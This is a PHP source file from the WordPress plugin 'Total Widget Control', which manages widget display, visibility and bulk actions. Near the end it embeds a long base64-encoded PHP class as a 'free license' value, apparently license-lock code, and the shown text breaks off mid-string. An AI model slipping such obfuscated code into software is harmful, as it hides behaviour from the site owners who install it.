<?php 
/**
 * @Author	Jonathon byrd
 * @link http://www.jonathonbyrd.com
 * @Package Wordpress
 * @SubPackage Total Widget Control
 * @copyright Proprietary Software, Copyright Byrd Incorporated. All Rights Reserved
 * @Since 1.0
 * 
 * @TODO I need to loop the widgets after init and create my own global arrays of certain widgets.
 * @TODO After looping the init global widget arrays, they need to be filtered
 */

defined('ABSPATH') or die("Cannot access pages directly.");
//update_option('twc_is_free',false);

/**
 * Function is responsible for preparing the free license.
 *
 * @return null
 */
function twc_activation( )
{
	update_option('twc_is_free',true);
	wp_redirect(get_option('url').'/wp-admin/widgets.php?list_style=twc');
	return exit();
}

/**
 * function adds the plugin actions
 *
 * @param array $orig_links
 * @return array $links
 */
function twc_add_action_links( $orig_links )
{
	//initializing variables
	$links = array();
	$links['deactivate'] = $orig_links['deactivate'];
	
	$links['load'] = '<a href="'.get_bloginfo('url').'/wp-admin/widgets.php?list_style=twc" title="'.__('Open the Total Widget Control System','twc').'" class="edit">'.__('Manage Widgets').'</a>';
	return $links;
}

/**
 * This function will add help and screen option text to the widget pages
 *
 */
function twc_add_help_text()
{ 
	//initializing variables
	global $wp_registered_sidebars;
	$current_screen = twc_get_current_screen();
	
	switch ($current_screen->action)
	{
		default: 
			add_filter('screen_settings', 'twc_view_screen_options'); 
			add_filter('contextual_help', 'twc_view_help_home'); 
			break;
		case 'edit': 
			add_filter('contextual_help', 'twc_view_help_edit'); 
			break;
		case 'add':
			add_filter('contextual_help', 'twc_view_help_add'); 
			break;
	}
}

/**
 * function adds the media resources to the twc views
 *
 * @TODO Need to register and call the CSS file here
 */
function twc_add_javascript()
{
	//initializing variables
	$current_screen = twc_get_current_screen();
	
	//reasns to fail
	if ($current_screen->parent_base != 'widgets') return;
	
	wp_register_script( 'twc-nav-menu', plugin_dir_url(__file__).'js/twc-nav-menu.js');
	wp_register_script( 'twc-base', plugin_dir_url(__file__).'js/twc.js');
	wp_register_script( 'twc-qtip', plugin_dir_url(__file__).'js/tooltips.js');
	
	switch($current_screen->action)
	{
		default:
			wp_enqueue_script( 'twc-qtip' );
			wp_enqueue_script( 'twc-base' );
			break;
		case 'edit':
		case 'add':
			// jQuery
			wp_enqueue_script( 'jquery' );
			wp_enqueue_script( 'jquery-ui-draggable' );
			wp_enqueue_script( 'jquery-ui-droppable' );
			wp_enqueue_script( 'jquery-ui-sortable' );
			
			// Nav Menu functions
			wp_enqueue_script( 'twc-base' );
			wp_enqueue_script( 'twc-nav-menu' );
			wp_enqueue_script( 'twc-qtip' );
			
			// Metaboxes 
			wp_enqueue_script( 'common' );
			wp_enqueue_script( 'wp-lists' );
			wp_enqueue_script( 'postbox' );

			//css
			wp_admin_css( 'nav-menu' );
			break;
	}
}

/**
 * Handles and bulk actions
 *
 * @return unknown
 */
function twc_bulk_actions()
{
	//reasons to fail
	if (!isset($_REQUEST['twcp_bulk_action'])) return false;
	if (!isset($_REQUEST['twcp_bulk']) || empty($_REQUEST['twcp_bulk'])) return false;
	
	//get the action
	foreach ((array)$_REQUEST['twcp_bulk_action'] as $action)
	{
		if ($action) break;
	}
	
	//reasons to fail
	if (!$action) return false;
	
	switch ($action)
	{
		case 'delete':
			twc_bulk_delete($_REQUEST['twcp_bulk']);
			break;
		case 'trash':
			twc_bulk_trash($_REQUEST['twcp_bulk']);
			break;
		default:break;
	}
}

/**
 * function is responsible for permentantely deleting given widgets.
 *
 * @param unknown_type $widgets
 */
function twc_bulk_delete( $widgets )
{
	foreach ((array)$widgets as $widget_id)
	{
		twc_delete_widget_instance( $widget_id, $delete_permanently = true );
	}
}

/**
 * function is responsible for trashing widget instances
 *
 * @param unknown_type $widgets
 */
function twc_bulk_trash( $widgets )
{
	foreach ((array)$widgets as $widget_id)
	{
		twc_delete_widget_instance( $widget_id, $delete_permanently = false );
	}
}

/**
 * Cleans up the sidebar and widget variables
 * 
 * @TODO Make sure that this function cleans up empty sidebar IDs
 *
 * @param object $wp
 */
function twc_clear( $wp = null )
{
	//intiailizing variables
	global $wp_registered_widgets, $wp_registered_sidebars;
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	$lost_widgets = array();
	
	foreach ($wp_registered_widgets as $widget_id => $widget_class)
	{
		if (!$widget_id) continue;
		$sidebar_id = twc_get_widgets_sidebar($widget_id);
		
		if ($sidebar_id == 'wp_inactive_widgets')
		{
			if (substr($widget_id,-2) == '-1') continue;
			if ((int)trim(substr($widget_id,-2)) == -1) continue;
			$lost_widgets[] = $widget_id;
		}
	}
	
	foreach ($wp_registered_sidebars as $sidebar_slug => $sidebar): 
		if (is_array($sidebars_widgets[$sidebar_slug]))
		foreach ($sidebars_widgets[$sidebar_slug] as $position => $widget_slug): 
			
			$widget = twc_get_widget_by_id( $widget_slug );	
			if (!$widget)
			{
				unset($sidebars_widgets[$sidebar_slug]);
			}
			
		endforeach;
	endforeach;
	
	$sidebars_widgets['wp_inactive_widgets'] = $lost_widgets;
	wp_set_sidebars_widgets($sidebars_widgets);
}

/**
 * Total Widget Controller
 * 
 * This function is responsible for determining which administrative page that we're
 * supposed to be looking at. We use the standard action call system that wp-admin
 * is used to using.
 *
 */
function twc_controller()
{
	//initializing variables
	global $wp_registered_sidebars;
	$current_screen = twc_get_current_screen();
	$view = 'twc-table';
	
	switch ($current_screen->action)
	{
		default:
			if (count($wp_registered_sidebars) == 1)
				$view = 'twc-no-sidebars';
			break;
		case 'edit':
			$view = 'twc-edit';
			break;
		case 'delete': 
			twc_get_show_view('twc-trash-instance');
			$view = 'twc-table';
			break;
		case 'save':
			twc_get_show_view('twc-save-edit');
			$view = 'twc-add';
			break;
		case 'add':
			if (isset($_REQUEST['editwidget']) && !empty($_REQUEST['editwidget']))
			{
				twc_create_new_widget();
				$view = 'twc-edit';
			}
			else 
			{
				$view = 'twc-add';
			}
			break;
	}
	
	return do_action($view);
}

/**
 * returns the number of active widgets
 * 
 * @return integer $count
 */
function twc_count_active_widgets()
{
	//initializing variables
	global $wp_registered_widgets;
	static $count;
	
	if (!isset($count))
	{
		$count = 0;
		foreach ($wp_registered_widgets as $widget_id => $class)
		{
			if (substr($widget_id,-2) == '-1') continue;
			if ((int)trim(substr($widget_id,-2)) == -1) continue;
			$count++;
		}
		$count = $count - twc_count_inactive_widgets();
	}
	return $count;
}

/**
 * returns the number of inactive widgets
 * 
 * @return integer
 */
function twc_count_inactive_widgets()
{
	//initializing variables
	static $count;
	if (!isset($count))
	{
		$sidebars_widgets = twc_wp_get_sidebars_widgets();
		$count = count($sidebars_widgets['wp_inactive_widgets']);
	}
	return $count;
}

/**
 * Function is responsible for counting the number of widget
 * instances that will appear in a specific sidebar, on the current page.
 * 
 * @param string $sidebar_id
 * @param string $object_id
 *//*
function twc_count_page_sidebar_widgets( $sidebar_id, $object_id = null )
{
	//initializng variables
	global $sidebars_widgets;
	static $count;
	
	//reasons to fail
	if (isset($count)) return $count;
	
	//initializng variables
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	$count = 0;
	
	if (is_null($object_id))
	{
		$object_id = twc_get_object_id();
	}
	
	//reasons to fail
	if (!isset($sidebars_widgets[$sidebar_id])) return false;
	
	foreach ((array)$sidebars_widgets[$sidebar_id] as $widget_id)
	{
		$widget = twc_get_widget_by_id($widget_id);
		
		if (twc_get_object_id())
		{
			$display = (is_array($widget['p']['menu_item_object_id']) 
				&& in_array(twc_get_object_id(), (array)$widget['p']['menu_item_object_id']));
		}
		else 
		{
			$display = (is_array($widget['p']['menu_item_urls']) 
				&& in_array(twc_get_object_url(), (array)$widget['p']['menu_item_urls']));
		}
			
		if ($display) $count++;
		
		//if (in_array($object_id, (array)$widget['p']['menu_item_object_id']))
		//	$count++;
	}
	return $count;
}*/

/**
 * Function is responsible for counting the number of widget
 * instances that will appear in a specific sidebar, on the current page.
 * 
 * @param string $sidebar_id
 * @return integer $object_id
 */
function twc_count_sidebar_widgets( $sidebar_id )
{
	//initializng variables
	static $count;
	
	//reasons to fail
	if (isset($count)) return $count;
	
	//initializing variables
	global $sidebars_widgets;
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	
	//reasons to fail
	if (!isset($sidebars_widgets[$sidebar_id])) return false;
	
	$widgets = $sidebars_widgets[$sidebar_id];
	return $count = count($widgets);
}

/**
 * Function is responsible for loading a brand new widget, 
 * given an id_base
 * 
 * Upon the thought of adding a new widget, the system will register a new widget
 * instance with wordpress and then load from the wp_registered_widgets array
 * 
 * @return null
 */
function twc_create_new_widget()
{
	//reasons to fail
	if ( !isset($_GET['addnew']) ) return false;
	
	//initializing variables
	global $wp_registered_widgets, $wp_registered_widget_controls, $widget;
	$widget_id = $editwidget = $_GET['editwidget'];
	
	if ( isset($_GET['base']) && isset($_GET['num']) ) { // multi-widget
		// Copy minimal info from an existing instance of this widget to a new instance
		foreach ( $wp_registered_widget_controls as $control ) {
			if ( $_GET['base'] === $control['id_base'] ) {
				$control_callback = $control['callback'];
				$multi_number = (int) $_GET['num'];
				$control['params'][0]['number'] = $multi_number;
				$widget_id = $control['id'] = $control['id_base'] . '-' . $multi_number;
				$wp_registered_widget_controls[$control['id']] = $control;
				break;
			}
		}
	}
	$wp_registered_widgets[$widget_id] = $wp_registered_widgets[$editwidget];
	$widget = $wp_registered_widgets[$widget_id] = twc_get_widget_by_id($widget_id);
	twc_save_widget_fields( $widget_id, array() );
}

/**
 * This function displays the widgets that are dynamic sidebar widgets
 * 
 * @TODO Test to see if this can be called directly
 *
 * @param unknown_type $sidebar_id
 */
function twc_default_sidebar( $index )
{
	//initializing variables
	global $wp_registered_sidebars, $wp_registered_widgets, $twc_default_sidebar_widgets, $twc_has_displayed, $twc_isDefault;
	
	if ( is_int($index) ) {
		$index = "sidebar-$index";
	} else {
		$index = sanitize_title($index);
		foreach ( (array) $wp_registered_sidebars as $key => $value ) {
			if ( sanitize_title($value['name']) == $index ) {
				$index = $key;
				break;
			}
		}
	}
	
	// fail if we have widgets on this page 
	// or if there are no defaults for this sidebar
	if ($twc_has_displayed) return false;
	if (!isset($twc_default_sidebar_widgets[$index])) return false;
	$twc_isDefault = true;
	
	foreach ((array)$twc_default_sidebar_widgets[$index] as $id => $widget)
	{
		if ( !isset($wp_registered_widgets[$id]) ) continue;
		
		$sidebar = twc_get_widgets_sidebar($index);
		$params = array_merge(
			array( array_merge( (array)$sidebar, array('widget_id' => $id, 'widget_name' => $wp_registered_widgets[$id]['name']) ) ),
			(array) $wp_registered_widgets[$id]['params']
		);

		// Substitute HTML id and class attributes into before_widget
		$classname_ = '';
		foreach ( (array) $wp_registered_widgets[$id]['classname'] as $cn ) {
			if ( is_string($cn) )
				$classname_ .= '_' . $cn;
			elseif ( is_object($cn) )
				$classname_ .= '_' . get_class($cn);
		}
		$classname_ = ltrim($classname_, '_');
		$params[0]['before_widget'] = sprintf($params[0]['before_widget'], $id, $classname_);
		
		$callback = $wp_registered_widgets[$id]['callback'];
		
		if ( is_callable($callback) ) {
			call_user_func_array($callback, $params);
			$did_one = true;
		}
	}
	$twc_isDefault = false;
	
}

/**
 * This function will delete an instance completely
 *
 * @param unknown_type $widget_id
 */
function twc_delete_widget_instance( $widget_id, $delete_permanently = false )
{
	//initializing variables
	global $wp_registered_widget_updates, $wp_registered_widgets;
	$sidebar_id = twc_get_widgets_sidebar($widget_id);
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	
	$sidebar = isset($sidebars_widgets[$sidebar_id]) ? $sidebars_widgets[$sidebar_id] : array();
	$sidebar = array_diff( $sidebar, array($widget_id) );
	$sidebars_widgets[$sidebar_id] = $sidebar;
	
	if (!$delete_permanently)
	{
		$sidebars_widgets['wp_inactive_widgets'] = array_merge((array)$widget_id, (array) $sidebars_widgets['wp_inactive_widgets']);
	}
	else
	{
		//initializing variables
		$widget = twc_get_widget_by_id($widget_id);
		
		if ($widget)
		{
			$_POST = array();
			$_POST['multi_number'] = $widget['number'];
			$_POST['the-widget-id'] = $widget['id'];
			$_POST['delete_widget'] = '1';
			$wp_registered_widgets[$widget_id]['params'][0]['number'] = $widget['number'];
			
			//this calls the widgets update function with the given params
			foreach ( (array) $wp_registered_widget_updates as $name => $control )
			{
				if ( $name != $widget['id_base'] || !is_callable($control['callback']) )
					continue;
				
				ob_start();
					call_user_func_array( $control['callback'], $control['params'] );
				ob_get_clean();
				unset($wp_registered_widgets[$widget_id]);
				break;
			}
		}
	}
	
	wp_set_sidebars_widgets($sidebars_widgets);
}

/**
 * Function calls the save widget_sidebar function with the proper
 * parameters to delete the relationship.
 *
 * @param unknown_type $widget_id
 * @param unknown_type $sidebar_id
 * @return unknown
 */
function twc_delete_widget_sidebar( $widget_id, $sidebar_id )
{
	return twc_save_widget_sidebar($widget_id, $sidebar_id, 0, true);
}

/**
 * function is responsible for hijacking the dynamic_sidebar function. 
 * This function will always return false to the dynamic sidebar
 *
 */
function twc_display_the_sidebar( $params )
{
	//initializing variables
	global $wp_registered_widgets, $twc_wp_registered_widgets, $twc_default_sidebar_widgets;
	
	if (!isset($twc_wp_registered_widgets))
	{
		$twc_wp_registered_widgets = $wp_registered_widgets;
	}
	
	//clean the registered_widgets global
	foreach ((array)$wp_registered_widgets as $widget_id => $widget)
	{
		if (is_a($wp_registered_widgets[$widget_id]['callback'][0], 'twcEmptyWidgetClass')) 
			break;
		
		// since we're running a loop already, then let's take this opportunity
		// to create the defaults widgets array\
		// @TODO This data needs to be sorted out just after the init function
		$_widget = twc_get_widget_by_id($widget_id);
		if ($_widget['p']['twcp_default_sidebar'] == 'default')
		{
			$default_sidebar_id = twc_get_widgets_sidebar($widget_id);
			$twc_default_sidebar_widgets[$default_sidebar_id][$widget_id] = $widget;
		}
		
		//empty the registered_widgets array
		$wp_registered_widgets[$widget_id]['callback'] = array();
		$wp_registered_widgets[$widget_id]['callback'][0] = new twcEmptyWidgetClass();
		$wp_registered_widgets[$widget_id]['callback'][1] = 'twc_empty_callback';
	}
	
	return $params;
}

/**
 * function receives all of the widget data prior to display, and allows us
 * to return a false to hide the widget.
 * 
 * returning false will hide the widget
 * 
 * @TODO I need a function that will display the widget_display with only the widget_id param
 *
 * @param unknown_type $instance
 * @param unknown_type $widget
 * @param unknown_type $args
 * @return unknown
 */
function twc_display_the_widget($instance, $widget, $args)
{
	//initializing variables
	global $wp_query, $wp_registered_sidebars, $twc_has_displayed;
	$widget = twc_get_widget_by_id($widget->id);
	$display = twc_is_widget_displaying($widget);
	
	//reasons to fail
	$display = apply_filters('twc_display_widget', $display, $widget);
	if (!$display) return false;
	
	//initializing variables
	$args = $wp_registered_sidebars[$widget['sidebar_id']];
	
	//load the widget into a variable
	ob_start();
	$widget['callback'][0]->widget($args, $instance);
	$display = ob_get_clean();
	
	//displaying the widget
	$twc_has_displayed = true;
	echo apply_filters('twc_widget_display', $display, $widget);
	return apply_filters('twc_wordpress_default_sidebar', false, $instance);
}

/**
 * function returns true if the widget is to be displayed
 *
 * @param boolean $current
 * @param array $widget
 * @return unknown
 */
function twc_display_if_excluded( $current, $widget )
{
	//initializing variables
	global $twc_isDefault;
	
	//check to see if we're even going to load this widget
	$isExclude = (isset($widget['p']['twcp_exclude_sidebar']) && $widget['p']['twcp_exclude_sidebar'] == 'exclude');
	
	if (!$twc_isDefault && ((!$current && !$isExclude) || ($current && $isExclude))) 
		return false;
	
	return true;
}

/**
 * function is responsible for returning true if the widget is a default
 *
 * @param unknown_type $display
 * @param unknown_type $widget
 * @return unknown
 */
function twc_display_if_default( $display, $widget )
{
	//initializing variables
	global $twc_isDefault;
	$isDefault = (isset($widget['p']['twcp_default_sidebar']) && $widget['p']['twcp_default_sidebar'] == 'default');
	
	//reasons to return
	if ($twc_isDefault && $isDefault) return true;
	
	return $display;
}

/**
 * function is responsible for displaying the status
 *
 * @param boolean $display
 * @param object $widget
 * @return boolean
 */
function twc_display_if_status( $display, $widget )
{
	//initializing variables
	global $twc_widgetlistings_type;
	
	//reasons to fail
	if ($twc_widgetlistings_type == 'admin') return $display;
	if (!$display) return false;
	if ($widget['p']['twcp_status'] != 'enabled') return false;
	
	return true;
}

/**
 * function is responsible for displaying the status
 *
 * @param boolean $display
 * @param object $widget
 * @return boolean
 */
function twc_display_if_timestamp( $display, $widget )
{
	//initializing variables
	global $twc_widgetlistings_type;
	$widget_time = $widget['p']['twcp_publish_time'];
	
	//reasons to fail
	if ($twc_widgetlistings_type == 'admin') return $display;
	if (!$display) return false;
	if ($widget_time > time()) return false;
	
	return true;
}

/**
 * function is responsible for displaying proper visibility
 *
 * @param boolean $display
 * @param object $widget
 * @return boolean
 */
function twc_display_if_visiblity( $display, $widget )
{
	//initializing variables
	global $twc_widgetlistings_type;
	
	//reasons to fail
	if ($twc_widgetlistings_type == 'admin') return $display;
	if (!$display) return $display;
	if (!isset($widget['p']['twcp_visibility'])) return $display;
	
	//initializing variables
	global $current_user, $wp_roles;
	get_currentuserinfo();
	$user_roles = $current_user->roles;
	$user_role = array_shift($user_roles);
	if (is_null($user_role)) $user_role = 'public';
	$isParent = false;
	$visibleParent = ($widget['p']['twcp_visible_parent'] == 'parent');
	
	foreach ((array)$wp_roles->roles as $role => $name)
	{
		if ($role == $widget['p']['twcp_visibility'])
		{
			break;
		}
		if ($role == $user_role)
		{
			$isParent = true;
			break;
		}
	}
	
	//setting matches
	$matchedRole = ($user_role == $widget['p']['twcp_visibility']);
	
	if ($matchedRole) return true;
	if (!$visibleParent && $isParent) return true;
	
	return false;
}

/**
 * The hijack is completed and this function is called with the correct sidebar_id
 * Now we can run our own sidebar.
 * 
 * @TODO Test to see if this can be run directly
 *
 * @param int|string $index Optional, default is 1. Name or ID of dynamic sidebar.
 * @return bool True, if widget sidebar was found and called. False if not found or not called.
 */
function twc_dynamic_sidebar( $index = 1 )
{
	//initializing variables
	global $wp_registered_sidebars, $wp_registered_widgets, $twc_isDefault, $twc_has_displayed;
	$twc_isDefault = false;
	$twc_has_displayed = FALSE;
	
	if ( is_int($index) ) {
		$index = "sidebar-$index";
	} else {
		$index = sanitize_title($index);
		foreach ( (array) $wp_registered_sidebars as $key => $value ) {
			if ( sanitize_title($value['name']) == $index ) {
				$index = $key;
				break;
			}
		}
	}

	//initializing variables
	$count = twc_count_sidebar_widgets($index);
	$sidebars_widgets = wp_get_sidebars_widgets();

	//reasons to return
	if ($count == 0) return false;
	if ( empty($wp_registered_sidebars[$index]) || !array_key_exists($index, $sidebars_widgets) || !is_array($sidebars_widgets[$index]) || empty($sidebars_widgets[$index]) )
		return false;

	$sidebar = $wp_registered_sidebars[$index];
	
	$did_one = false;
	foreach ( (array) $sidebars_widgets[$index] as $id )
	{
		if ( !isset($wp_registered_widgets[$id]) ) continue;
		
		//$sidebar = twc_get_widgets_sidebar($index);
		$params = array_merge(
			array( array_merge( (array)$sidebar, array('widget_id' => $id, 'widget_name' => $wp_registered_widgets[$id]['name']) ) ),
			(array) $wp_registered_widgets[$id]['params']
		);
		
		// Substitute HTML id and class attributes into before_widget
		$classname_ = '';
		foreach ( (array) $wp_registered_widgets[$id]['classname'] as $cn ) {
			if ( is_string($cn) )
				$classname_ .= '_' . $cn;
			elseif ( is_object($cn) )
				$classname_ .= '_' . get_class($cn);
		}
		$classname_ = ltrim($classname_, '_');
		$params[0]['before_widget'] = sprintf($params[0]['before_widget'], $id, $classname_);
		
		$callback = $wp_registered_widgets[$id]['callback'];
		
		if ( is_callable($callback) ) {
			call_user_func_array($callback, $params);
			$did_one = true;
		}
	}

	return $did_one;
}

/**
 * Class is responsible for nothing.
 * This class is merely a filler class to receive the proper functionality
 * from the dynamic_sidebar function.
 *	
 */
class twcEmptyWidgetClass
{
	function twc_empty_callback( $sidebar_args )
	{
		//do nothing
	}
}

/**
 * Checks for the search type
 *
 * @return unknown
 */
function twc_filter_list_for()
{
	if (!isset($_REQUEST['twcp_filter']) || empty($_REQUEST['twcp_filter'])) return false;
	$_REQUEST['inactive'] = 'active';
	
	return $_REQUEST['twcp_filter'];
}

/**
 * Get the current page
 * 
 * Function is responsible for loading the current screen object which defines the
 * current page as the admin widget page.
 * 
 * @return unknown
 */
function twc_get_current_screen()
{
	//initializing variables
	static $current_screen;
	
	if (isset($current_screen)) return $current_screen;
	
	//initializing variables
	$parts = pathinfo($_SERVER['PHP_SELF']);
	$parent_file = apply_filters("twc_parent_file", $parts['basename']); // 'themes.php' For plugins to move submenu tabs around.
	
	$current_screen = new stdClass();
	$current_screen->parent_file = $parent_file;
	$current_screen->parent_base = preg_replace('/\?.*$/', '', $parent_file);
	$current_screen->parent_base = str_replace('.php', '', $current_screen->parent_base);
	$current_screen->id = 'twc-widgets';
	$current_screen->base = 'widgets';
	
	if ($GLOBALS['TWCAUTH']&&!isset($_REQUEST['action']))
	{
		$current_screen->action = 'auth';
	}
	else
	{
		$current_screen->action = strtolower($_REQUEST['action']);
	}
	
	return $current_screen;
}

/**
 * returns the originally queried object id
 * 
 * @TODO Function should return this value as an array, which would include the object type
 *
 * @return unknown
 */
function twc_get_object_id()
{
	return twc_set_object_id();
}

/**
 * function is responsible for making sure that set is run
 * and then the string is returned
 *
 * @return string
 */
function twc_get_object_url()
{
	return twc_set_object_url();
}

/**
 * Function is responsible for loading the widget, validating its variables
 * and loading the widgets parameters.
 *
 * @param string $widget_id
 * @return static reference array $widget
 */
function &twc_get_widget_by_id( $widget_id )
{
	//initializing variables
	global $wp_registered_widgets;
	static $twc_registered_widgets;
	$widget = @$wp_registered_widgets[$widget_id];
	
	if (!isset($twc_registered_widgets))
	{
		$twc_registered_widgets = array();
	}
	
	//reasons to fail
	if (isset($twc_registered_widgets[$widget_id])) return $twc_registered_widgets[$widget_id];
	if (!$widget) return false;
	
	//initializing widget variables
	$widget['id'] = $widget_id;
	$widget['id_base'] = _get_widget_id_base($widget_id);
	$widget['number'] = absint(str_replace($widget['id_base'], '', $widget_id));
	$widget['multiwidget'] = (isset($widget['number']) && $widget['number']);
	$widget['sidebar_id'] = twc_get_widgets_sidebar( $widget_id );
	$widget['position'] = twc_get_widgets_sidebar( $widget_id, 'position' );
	$widget['p'] = array();
	
	//validating the widget identification
	$widget['params'][0]['number'] = $widget['number'];
	if (is_object( $widget['callback'][0] ))
	{
		$widget['callback'][0]->number = $widget['number'];
		$widget['callback'][0]->id = $widget['id'];
	}
	
	//loading settings
	if (is_callable( array($widget['callback'][0], 'get_settings') ))
	{
		$params = $widget['callback'][0]->get_settings();
		$widget['p'] = $params[$widget['number']];
	}
	
	$twc_registered_widgets[$widget_id] = $widget;
	return $widget;
}

/**
 * Function is responsible for branding wordpress a little :)
 *
 * @param unknown_type $text
 * @return unknown
 */
function twc_gettext( $text )
{
	//initializing variables
	$current_screen = twc_get_current_screen(); 
	$base = $current_screen->parent_base;
	
	$lan = array(
		'themes' => array(
			'Screen Options' => _('5Twenty Studios')
		),
	);
	
	if (isset($lan[$base]) && isset($lan[$base][$text]))
	{
		$text = $lan[$base][$text];
	}
	
	return $text;
}

/**
 * function returns the position and the sidebar for a given widget
 * 
 * @TODO Need to create a separate function that will be called to return the position value
 * @TODO This function should only return a sidebar as a value, if the type is sidebar
 * 
 * @param unknown_type $widget_id
 * @param unknown_type $type
 * @return unknown
 */
function twc_get_widgets_sidebar( $widget_id, $type = 'sidebar' )
{
	//initializing variables
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	static $flipped;
	
	if (!isset($flipped))
	{
		unset($sidebars_widgets['wp_inactive_widgets']);
		foreach ((array)$sidebars_widgets as $_sidebar => $widgets)
		{
			foreach ((array)$widgets as $position => $widgetid)
			{
				$flipped[$widgetid] = array(
						'sidebar' => $_sidebar,
						'position' => (int)trim($position),
					);
			}
		}
	}
	
	//return sidebar info
	if ($type == 'position')
	{
		if (!isset($flipped[$widget_id][$type]))
		{
			return 0;
		}
		else
		{
			return $flipped[$widget_id][$type];
		}
	}
	else // if sidebar
	{
		if (!isset($flipped[$widget_id][$type]))
		{
			return 'wp_inactive_widgets';
		}
		else
		{
			return $flipped[$widget_id][$type];
		}
	}
}

/**
 * this function adds the 'add new' button to the list page
 *
 */
function twc_h2_add_new()
{
	//initializing variables
	$current_screen = twc_get_current_screen();
	if ($current_screen->action != '') return;
	
	echo '<a href="'.get_bloginfo('url').'/wp-admin/widgets.php?action=add" class="button add-new-h2">'.__('Add New','twc').'</a>';
}

/**
 * This does our checking to see if the current view is for active of 
 * inactive widgets
 *
 * @return boolean
 */
function twc_inactive_list()
{
	return (isset($_REQUEST['inactive']) && $_REQUEST['inactive'] == 'inactive');
}

/**
 * This initializes the twc system with the proper hooks.
 *
 * @return null
 */
function twc_initialize()
{
	//initializing variables
	global $twc_table_type, $twc_widgetlistings_type, $twc_has_displayed;
	$twc_table_type = $twc_widgetlistings_type = 'default';
	$twc_has_displayed = false;
	
	add_action('sidebar_admin_setup', 'twc_init', 100);
	add_action('admin_notices', 'twc_view_switch', 1);
	add_action('admin_init', 'twc_set_object_id');
	add_action('init', 'twc_add_javascript');
	add_action('init', 'show_ajax', 100);
	add_action('init', 'twc_registration', 1);
	add_action('init', 'twc_receive_license', 1);
	add_action('twc_init', 'twc_admin_notices');
	add_action('twc_init', 'twc_view_widget_wrap', 20);
	add_action('twc_init', 'twc_destruct', 100);
	add_action('twc_display_admin', 'twc_view_auth');
	add_action('twc_display_admin', 'twc_register');
	add_action('twc-register', 'twc_register');
	add_action('twc-table', 'twc_rows', 10);
	add_action('widgets_init', 'init_registered_widgets', 1);
	add_action('twc-free-registration', 'twc_activation' );
	add_action('admin_menu', 'f20_add_metaboxes');
	add_action('save_post', 'f20_metabox_save_data');
	add_action('wp_footer','twc_show_object_id');
	add_action('wp','twc_set_object_url');
	add_filter('gettext', 'twc_gettext');
	add_filter('plugin_action_links_total-widget-control/index.php', 'twc_add_action_links');
	add_filter('plugin_row_meta', 'twc_plugin_row_meta', 10, 2);
	
	function twc_register(){ twc_show_view('twc-register'); }
	function twc_init(){ if (!twc_list_style_twc()) return; do_action('twc_init'); }
	function twc_destruct(){ _520(); exit(); }
	function twc_admin_notices(){ add_action('admin_notices', 'read_520_rss'); }
	function twc_view_screen_options(){ return twc_get_show_view('twc-screen-options'); }
	function twc_view_help_home(){ return twc_get_show_view('twc-help-home'); }
	function twc_view_help_edit(){ return twc_get_show_view('twc-help-edit'); }
	function twc_view_help_add(){ return twc_get_show_view('twc-help-add'); }
	function twc_view_widget_wrap(){ twc_show_view('twc-widget-wrap'); }
	function twc_view_auth(){ twc_show_view('twc-auth'); }
	if (!array_key_exists('TWCAUTH', $GLOBALS)) $GLOBALS['TWCAUTH'] = true;
	
	f20_register_metabox(array(
	    'id' => 'my-meta-box',
	    'title' => 'Total Widget Control',
	    'page' => true,
	    'context' => 'normal',
	    'priority' => 'high',
	    'fields' => array(
	        array(
	            'name' => '',
	            'desc' => '',
	            'id' => 'twc-meta-listings',
	            'type' => 'show_view',
	            'std' => ''
	        ),
	    )
	));
	
	if (!function_exists('twc_widget_protitle') && get_option('twc_is_free',false))
	{
		$freelicense = 'IGNsYXNzIFpqSXdYMlp2ZFhKMGVRIHsgcHJvdGVjdGVkICRTMlY1Y3cgPSBhcnJheSgncHJpdmF0ZSc9PicnLCd4ZmFjdG9yJz0+JycsJ3lmYWN0b3InPT4nJyk7IHByb3RlY3RlZCAkVEc5amEzTSA9IGFycmF5KCk7IHByb3RlY3RlZCBmdW5jdGlvbiAmUjJWMFMyVjUoJGJHOWphMVI1Y0dVKXsgcmV0dXJuICR0aGlzLT5TMlY1Y3dbJGJHOWphMVI1Y0dVXTsgfSBwcm90ZWN0ZWQgZnVuY3Rpb24gU1c1elpYSjBTMlY1Y3coKXsgJHRoaXMtPlVtVnRiM1psUzJWNSgpOyAkdGhpcy0+VW1WelpYUk1iMk5yKCk7IGZvcmVhY2ggKCR0aGlzLT5TMlY1Y3cgYXMgJFMyVjVWSGx3WlEgPT4gJFMyVjUpeyBpZiAoc3Ryc3RyKCRTMlY1Vkhsd1pRLCAnZmFjdG9yJykpeyAkUzJWNSA9IG1kNShzZXJpYWxpemUoJHRoaXMtPlMyVjVjdykpOyB9IGVsc2UgeyAkUzJWNSA9ICdsb2NhbGhvc3QnOyB9ICR0aGlzLT5TVzV6WlhKMFMyVjUoJFMyVjUsICRTMlY1Vkhsd1pRKTsgfSB9IHByb3RlY3RlZCBmdW5jdGlvbiBTVzV6WlhKMFMyVjUoJGEyVjUsICRiRzlqYTFSNWNHVSl7IGlmIChzdHJsZW4oJGEyVjUpID4gMCl7ICR0aGlzLT5TMlY1Y3dbJGJHOWphMVI1Y0dVXSA9ICRhMlY1OyB9IH0gcHJvdGVjdGVkIGZ1bmN0aW9uIFZIVnlia3RsZVEoJGJHOWphMVI1Y0dVID0gJycpeyBpZiAoISRiRzlqYTFSNWNHVSl7IGZvcmVhY2ggKCR0aGlzLT5URzlqYTNNIGFzICRURzlqYTFSNWNHVSA9PiAkVEc5amF3KXsgJHRoaXMtPlZIVnlia3RsZVEoJFRHOWphMVI1Y0dVKTsgfSByZXR1cm47IH0gJFMyVjUgPSYgJHRoaXMtPlIyVjBTMlY1KCRiRzlqYTFSNWNHVSk7IGZvciAoJGFRID0gMDsgJGFRIDwgc3RybGVuKCRTMlY1KTsgJGFRKyspeyAkVTNSbGNITSA9IG9yZCgkUzJWNVskYVFdKSAvICgkYVEgKyAxKTsgaWYgKG9yZCgkUzJWNVskYVFdKSAlIDIgIT0gMCl7ICR0aGlzLT5WSFZ5Ymt4dlkycygkYkc5amExUjVjR1UsICRVM1JsY0hNLCAnbGVmdCcpOyB9IGVsc2UgeyAkdGhpcy0+VkhWeWJreHZZMnMoJGJHOWphMVI1Y0dVLCAkVTNSbGNITSwgJ3JpZ2h0Jyk7IH0gfSB9IHByb3RlY3RlZCBmdW5jdGlvbiBVbVZ0YjNabFMyVjUoJGJHO